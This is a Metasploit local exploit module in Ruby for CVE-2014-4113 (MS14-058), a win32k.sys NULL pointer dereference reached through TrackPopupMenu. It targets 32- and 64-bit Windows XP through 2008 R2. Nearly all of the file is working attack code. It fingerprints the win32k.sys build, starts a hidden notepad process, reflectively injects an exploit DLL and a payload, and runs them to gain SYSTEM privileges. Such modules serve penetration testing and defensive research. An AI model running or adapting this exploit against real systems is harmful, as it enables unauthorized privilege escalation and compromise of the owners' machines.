# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
require &#039;msf/core/post/windows/reflective_dll_injection&#039;
require &#039;rex&#039;
 
class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking
 
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection
 
  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;           => &#039;Windows TrackPopupMenu Win32k NULL Pointer Dereference&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a NULL Pointer Dereference in win32k.sys, the vulnerability
        can be triggered through the use of TrackPopupMenu. Under special conditions, the
        NULL pointer dereference can be abused on xxxSendMessageTimeout to achieve arbitrary
        code execution. This module has been tested successfully on Windows XP SP3, Windows
        2003 SP2, Windows 7 SP1 and Windows 2008 32bits. Also on Windows 7 SP1 and Windows
        2008 R2 SP1 64 bits.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # vulnerability discovery and exploit in the wild
          &#039;juan vazquez&#039;, # msf module (x86 target)
          &#039;Spencer McIntyre&#039; # msf module (x64 target)
        ],
      &#039;Arch&#039;           => [ ARCH_X86, ARCH_X86_64 ],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
        },
      &#039;Targets&#039;        =>
        [
          # Tested on (32 bits):
          # * Windows XP SP3
          # * Windows 2003 SP2
          # * Windows 7 SP1
          # * Windows 2008
          [ &#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
          # Tested on (64 bits):
          # * Windows 7 SP1
          # * Windows 2008 R2 SP1
          [ &#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X86_64 } ]
        ],
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 4096,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2014-4113&#039;],
          [&#039;OSVDB&#039;, &#039;113167&#039;],
          [&#039;BID&#039;, &#039;70364&#039;],
          [&#039;MSB&#039;, &#039;MS14-058&#039;],
          [&#039;URL&#039;, &#039;http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 14 2014&#039;,
      &#039;DefaultTarget&#039;  => 0
    }))
  end
 
  def check
    os = sysinfo["OS"]
 
    if os !~ /windows/i
      return Exploit::CheckCode::Unknown
    end
 
    if sysinfo["Architecture"] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    elsif sysinfo["Architecture"] =~ /x86/i
      arch = ARCH_X86
    end
 
    file_path = expand_path("%windir%") << "\\system32\\win32k.sys"
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")
 
    # Neither target suports Windows 8 or 8.1
    return Exploit::CheckCode::Safe if build == 9200
    return Exploit::CheckCode::Safe if build == 9600
 
    if arch == ARCH_X86
      return Exploit::CheckCode::Detected if [2600, 3790, 7600, 7601].include?(build)
    else
      return Exploit::CheckCode::Detected if build == 7601
    end
 
    return Exploit::CheckCode::Unknown
  end
 
  def exploit
    if is_system?
      fail_with(Exploit::Failure::None, &#039;Session is already elevated&#039;)
    end
 
    if check == Exploit::CheckCode::Safe
      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
    end
 
    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Failure::NoTarget, &#039;Running against WOW64 is not supported&#039;)
    elsif sysinfo["Architecture"] =~ /x64/ && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, &#039;Session host is x64, but the target is specified as x86&#039;)
    elsif sysinfo["Architecture"] =~ /x86/ && target.arch.first == ARCH_X86_64
      fail_with(Failure::NoTarget, &#039;Session host is x86, but the target is specified as x64&#039;)
    end
 
    print_status(&#039;Launching notepad to host the exploit...&#039;)
    notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, {&#039;Hidden&#039; => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      # Reader Sandbox won&#039;t allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end
 
    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    if target.arch.first == ARCH_X86
      dll_file_name = &#039;cve-2014-4113.x86.dll&#039;
    else
      dll_file_name = &#039;cve-2014-4113.x64.dll&#039;
    end
 
    library_path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2014-4113&#039;, dll_file_name)
    library_path = ::File.expand_path(library_path)
 
    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
 
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)
 
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;Payload injected. Executing exploit...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)
 
    print_good(&#039;Exploit finished, wait for (hopefully privileged) payload execution to complete.&#039;)
  end
 
end

